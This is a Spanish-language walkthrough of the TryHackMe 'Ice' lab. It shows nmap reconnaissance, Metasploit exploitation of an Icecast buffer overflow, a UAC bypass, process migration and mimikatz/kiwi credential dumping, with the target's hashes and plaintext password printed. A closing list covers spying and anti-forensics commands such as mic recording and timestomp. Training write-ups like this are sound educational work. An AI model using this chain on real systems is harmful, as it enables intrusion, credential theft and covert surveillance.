# Ice - TryHackMe

## Reconocimiento

Vamos a realizar un escaneo de puertos con nmap para ver que servicios están corriendo en la máquina objetivo:

```bash
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 126
139/tcp   open  netbios-ssn   syn-ack ttl 126
445/tcp   open  microsoft-ds  syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126
5357/tcp  open  wsdapi        syn-ack ttl 126
8000/tcp  open  http-alt      syn-ack ttl 126
49152/tcp open  unknown       syn-ack ttl 126
49153/tcp open  unknown       syn-ack ttl 126
49154/tcp open  unknown       syn-ack ttl 126
49160/tcp open  unknown       syn-ack ttl 126
49183/tcp open  unknown       syn-ack ttl 126
49184/tcp open  unknown       syn-ack ttl 126
```

Vemos distintos puertos abiertos:

```
135/tcp: msrpc es un puerto utilizado por el protocolo RPC que permite la comunicación entre procesos en diferentes máquinas.

139/tcp: netbios-ssn es un puerto utilizado por el protocolo NetBIOS que permite la comunicación entre aplicaciones en una red local.

445/tcp: microsoft-ds es un puerto utilizado por el protocolo SMB que permite compartir archivos e impresoras en una red local.

3389/tcp: ms-wbt-server es un puerto utilizado por el protocolo RDP que permite la conexión remota a un escritorio de Windows.

5357/tcp: wsdapi es un puerto utilizado por el protocolo WSD que permite la comunicación entre dispositivos en una red local.

8000/tcp: http-alt es un puerto utilizado por el protocolo HTTP que permite la comunicación entre aplicaciones web.
```

Veamos las versiones de los servicios que están corriendo en la máquina objetivo:

```bash
nmap -sCV -p135,139,445,3389,5357,8000,49152,49153,49154,49160,49183,49184 10.128.158.180

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
|_ssl-date: 2026-07-13T15:29:24+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Dark-PC
| Not valid before: 2026-07-12T15:21:49
|_Not valid after:  2027-01-11T15:21:49
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http          Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49160/tcp open  msrpc         Microsoft Windows RPC
49183/tcp open  msrpc         Microsoft Windows RPC
49184/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-07-13T10:29:19-05:00
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 06:6f:2a:09:d2:cd (unknown)
| smb2-time: 
|   date: 2026-07-13T15:29:19
|_  start_date: 2026-07-13T15:21:10
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h14m59s, deviation: 2h30m00s, median: 0s
```

Al entrar en http://10.128.158.180:8000/ vemos que nos aparece un mensaje de error:

```
The source you requested could not be found. 
```

Vemos que la máquina objetivo está corriendo Windows 7 Professional, con Icecast streaming media server en el puerto 8000 y un servidor RDP en el puerto 3389. El nombre del host es Dark-PC.

## Explotación

Icecast streaming media server tiene un CVE-2004-1561 Icecast 2.0.1 and earlier Buffer Overflow via HTTP Headers Allows Remote Code Execution

Usaremos metasploit para explotar la vulnerabilidad de Icecast streaming media server.

```bash
sudo msfdb run

search Icecast
exploit/windows/http/icecast_header

use exploit/windows/http/icecast_header

[msf](Jobs:0 Agents:0) exploit(windows/http/icecast_header) >> set lhost 192.168.154.96
lhost => 192.168.154.96
[msf](Jobs:0 Agents:0) exploit(windows/http/icecast_header) >> set rhost 10.128.158.180
rhost => 10.128.158.180

exploit

(Meterpreter 1)(C:\Program Files (x86)\Icecast2 Win32) >
```

Hemos conseguido acceso a la máquina objetivo. 

## Escalada de privilegios

Veamos los procesos que están corriendo en la máquina objetivo:

```bash
(Meterpreter 1)(C:\Program Files (x86)\Icecast2 Win32) > ps

PID   PPID  Name                  Arch  Session  User          Path
 ---   ----  ----                  ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 416   4     smss.exe
 488   692   TrustedInstaller.exe
 544   536   csrss.exe
 584   692   svchost.exe
 592   536   wininit.exe
 604   584   csrss.exe
 652   584   winlogon.exe
 692   592   services.exe
 700   592   lsass.exe
 708   592   lsm.exe
 816   692   svchost.exe
 828   544   conhost.exe
 884   692   svchost.exe
 932   692   svchost.exe
 1020  692   svchost.exe
 1056  692   svchost.exe
 1140  692   svchost.exe
 1200  1528  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 1268  692   spoolsv.exe
 1324  692   svchost.exe
 1432  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
 1492  692   amazon-ssm-agent.exe
 1516  1020  dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
 1528  1508  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
 1708  692   LiteAgent.exe
 1744  692   svchost.exe
 1820  816   WmiPrvSE.exe
 1920  692   Ec2Config.exe
 1944  692   svchost.exe
 2228  692   sppsvc.exe
 2528  544   conhost.exe
 2560  1920  powershell.exe
 2704  692   vds.exe
 2736  1020  Defrag.exe
 2796  692   SearchIndexer.exe
 2928  692   svchost.exe
```

Veamos información del sistema:

```bash
(Meterpreter 1)(C:\Program Files (x86)\Icecast2 Win32) > sysinfo

Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

Mediante `run post/multi/recon/local_exploit_suggester` podemos ver que hay una vulnerabilidad de escalada de privilegios en el sistema:

```bash
run post/multi/recon/local_exploit_suggester
```

Nos crashea de esta forma desde el meterpreter, por lo que lo ponemos en background y hacemos lo siguiente:

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 2

exploit/windows/local/bypassuac_eventvwr
```

Encontramos la vulnerabilidad de escalada.

```bash
use exploit/windows/local/bypassuac_eventvwr
set SESSION 2
set LHOST 192.168.154.96
run
```

Se abre una nueva sesión de meterpreter con privilegios de administrador, usamos `getprivs` para ver los privilegios que tenemos:

```bash
(Meterpreter 3)(C:\Windows\system32) > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

Vemos que tenemos privilegios de administrador, por lo que podemos ejecutar cualquier comando en la máquina objetivo.

## Looting

```
Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't). 

In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?

Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts
```

Esta pista nos indica que debemos movernos a un proceso que tenga los permisos necesarios para interactuar con el servicio lsass, que es responsable de la autenticación en Windows. Para ello, necesitamos estar en un proceso que tenga la misma arquitectura que el servicio lsass (x64 en este caso) y que tenga los mismos permisos. El servicio de impresión (spoolsv.exe) cumple con estos requisitos y se reiniciará si lo cerramos.

```bash
migrate -N spoolsv.exe
[*] Migrating from 1528 to 1268...
[*] Migration completed successfully.
```

Veamos que usuario somos ahora:

```bash
getuid
Server username: NT AUTHORITY\SYSTEM
```

Ahora que somos el usuario NT AUTHORITY\SYSTEM, podemos usar mimikatz para obtener las credenciales de los usuarios en la máquina objetivo:

Usamos kiwi que es la versión actualizada

```bash
load kiwi
help
creds_all

msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)
```

## Post explotación

Veamos comandos útiles

**hashdump**: Vuelca las hashes de los usuarios en la máquina objetivo
**screenshare**: Permite ver la pantalla del usuario en la máquina objetivo
**record_mic**: Permite grabar el micrófono del usuario en la máquina objetivo
**timestomp**: Permite manipular las marcas de tiempo de los archivos en la máquina objetivo, por ejemplo, para ocultar la fecha de creación de un archivo
**golden_ticket_create**: Permite crear un ticket de autenticación golden para acceder a kerberos sin necesidad de autenticarse con un usuario y contraseña

**run post/windows/manage/enable_rdp**: Permite habilitar el escritorio remoto en la máquina objetivo, para poder conectarnos a ella mediante RDP